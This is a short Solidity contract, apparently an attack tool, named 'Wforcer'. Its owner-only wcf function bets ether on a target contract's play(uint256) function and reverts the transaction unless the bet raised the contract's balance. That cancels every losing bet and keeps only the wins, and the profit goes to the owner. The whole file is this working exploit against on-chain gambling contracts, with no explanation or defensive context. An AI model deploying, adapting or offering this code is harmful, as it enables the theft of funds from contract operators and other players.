1 pragma solidity ^0.4.11;
2 
3 contract Owned {
4   address owner;
5   function Owned() {
6     owner = msg.sender;
7   }
8   function kill() {
9     if (msg.sender == owner) suicide(owner);
10   }
11 }
12 
13 contract Wforcer is Owned {
14   function wcf(address target, uint256 a) payable {
15     require(msg.sender == owner);
16 
17     uint startBalance = this.balance;
18     target.call.value(msg.value)(bytes4(keccak256("play(uint256)")), a);
19     if (this.balance <= startBalance) revert();
20     owner.transfer(this.balance);
21   }
22   function withdraw() {
23     require(msg.sender == owner);
24     require(this.balance > 0);
25     owner.transfer(this.balance);
26   }
27 
28   function () payable {}
29 }